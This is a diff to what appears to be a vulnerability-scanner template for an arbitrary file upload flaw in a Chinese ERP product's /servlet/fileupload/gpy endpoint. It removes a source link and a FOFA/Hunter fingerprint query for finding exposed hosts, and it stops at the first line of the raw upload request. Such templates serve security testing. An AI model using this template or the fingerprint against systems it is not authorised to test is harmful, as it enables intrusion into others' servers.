@@ -3,14 +3,8 @@ info:
   name: 云时空社会化商业ERP系统gpy任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/1bff965b974279e7e8179e661e869013
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 1bff965b974279e7e8179e661e869013
-    fofa: + hunter`web.body="/static/plugin/lhgdialog/skins/default.css"`
 http:
 - raw:
   - 'POST /servlet/fileupload/gpy HTTP/1.1
